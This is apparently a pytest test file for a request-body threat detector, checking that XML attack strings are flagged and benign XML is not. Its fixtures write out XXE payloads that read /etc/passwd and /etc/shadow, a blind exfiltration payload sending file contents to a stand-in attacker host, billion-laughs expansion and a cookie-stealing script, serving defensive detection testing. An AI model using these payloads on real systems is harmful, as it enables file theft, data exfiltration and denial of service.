import pytest

from guard_core.models import SyncSecurityConfig
from guard_core.sync.handlers.suspatterns_handler import sus_patterns_handler

PUBLIC_DTD_PAYLOADS_FLAGGED = [
    pytest.param(
        '<!DOCTYPE foo PUBLIC "-//X//Y" "http://evil.example.com/evil.dtd">',
        id="public_external_dtd_basic",
    ),
    pytest.param(
        '<!DOCTYPE data PUBLIC "-//A//B//EN" "https://attacker.example/evil.dtd">',
        id="public_external_dtd_https",
    ),
]

PUBLIC_DTD_PADDED_SHAPES_FLAGGED = [
    pytest.param(129, 10, 10, id="129sp_after_doctype_and_public"),
    pytest.param(4096, 10, 10, id="4096sp_after_doctype_and_public"),
    pytest.param(10, 513, 10, id="513char_url"),
    pytest.param(10, 8192, 10, id="8192char_url"),
    pytest.param(10, 10, 129, id="129_trailing"),
    pytest.param(10, 10, 4096, id="4096_trailing"),
    pytest.param(4096, 8192, 4096, id="all_maxed"),
]


def _padded_public_dtd(gap1: int, gap2: int, gap3: int) -> str:
    return (
        "<!DOCTYPE"
        + " " * gap1
        + "PUBLIC"
        + " " * gap1
        + '"-//X//Y" "http://evil.example/'
        + "a" * gap2
        + '.dtd"'
        + " " * gap3
        + ">"
    )


XXE_PAYLOADS_FLAGGED = [
    pytest.param(
        '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>',
        id="external_entity_system_file_read",
    ),
    pytest.param(
        '<!ENTITY xxe SYSTEM "http://evil.example/xxe">',
        id="external_entity_system_http",
    ),
    pytest.param(
        '<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "http://evil.example/evil.dtd"> %xxe;]>',
        id="parameter_entity_external_dtd",
    ),
    pytest.param(
        '<!DOCTYPE data [<!ENTITY % file SYSTEM "file:///etc/shadow">'
        "<!ENTITY % eval \"<!ENTITY exfil SYSTEM 'http://evil.example/?%file;'>\">"
        "%eval;%exfil;]>",
        id="parameter_entity_blind_exfiltration",
    ),
    pytest.param(
        '<?xml version="1.0"?><!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/shadow">]>',
        id="declaration_with_external_entity",
    ),
    pytest.param(
        "<![CDATA[<script>alert(document.cookie)</script>]]>",
        id="cdata_script_wrapper",
    ),
    pytest.param(
        '<!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol1 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">'
        '<!ENTITY lol2 "&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;&lol1;">'
        "]>",
        id="billion_laughs_entity_expansion",
    ),
    pytest.param(
        '<?xml version="1.0"?><!DOCTYPE lolz [<!ENTITY lol "lol">'
        '<!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;">]><lolz>&lol2;</lolz>',
        id="billion_laughs_with_declaration_prefix",
    ),
]

ORDINARY_XML_NOT_FLAGGED = [
    pytest.param(
        '<?xml version="1.0" encoding="UTF-8"?><note><body>Hello</body></note>',
        id="bare_declaration_no_entity",
    ),
    pytest.param(
        '<?xml version="1.0"?><settings><timeout>30</timeout></settings>',
        id="bare_declaration_settings_document",
    ),
    pytest.param(
        "<settings><timeout>30</timeout><retries>3</retries></settings>",
        id="no_declaration_no_doctype",
    ),
    pytest.param(
        "<!DOCTYPE html><html><body>Hello</body></html>",
        id="html_doctype_no_internal_subset",
    ),
    pytest.param(
        '<?xml version="1.0"?><soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/'
        'soap/envelope/"><soap:Body>ok</soap:Body></soap:Envelope>',
        id="soap_envelope_no_entity",
    ),
    pytest.param(
        "A CDATA section lets you embed raw text without escaping special characters.",
        id="prose_mentions_cdata",
    ),
    pytest.param(
        "An XML entity like `&amp;` represents a reserved character.",
        id="prose_mentions_entity",
    ),
]


@pytest.mark.parametrize("payload", XXE_PAYLOADS_FLAGGED)
def test_xxe_payload_flagged_as_xml(payload: str) -> None:
    result = sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(threat.get("category") == "xml" for threat in result["threats"])


@pytest.mark.parametrize("payload", ORDINARY_XML_NOT_FLAGGED)
def test_ordinary_xml_not_flagged(payload: str) -> None:
    result = sus_patterns_handler.detect(
        content=payload, ip_address="198.51.100.4", context="request_body"
    )
    assert result["is_threat"] is False


@pytest.mark.parametrize("payload", PUBLIC_DTD_PAYLOADS_FLAGGED)
def test_public_dtd_payload_flagged_as_xml(payload: str) -> None:
    result = sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(threat.get("category") == "xml" for threat in result["threats"])


@pytest.mark.parametrize("gap1,gap2,gap3", PUBLIC_DTD_PADDED_SHAPES_FLAGGED)
def test_public_dtd_payload_flagged_past_every_old_cap(
    gap1: int, gap2: int, gap3: int
) -> None:
    sus_patterns_handler.configure(
        SyncSecurityConfig(detection_max_content_length=30000)
    )
    payload = _padded_public_dtd(gap1, gap2, gap3)
    result = sus_patterns_handler.detect(
        content=payload, ip_address="203.0.113.9", context="request_body"
    )
    assert result["is_threat"] is True
    assert any(threat.get("category") == "xml" for threat in result["threats"])
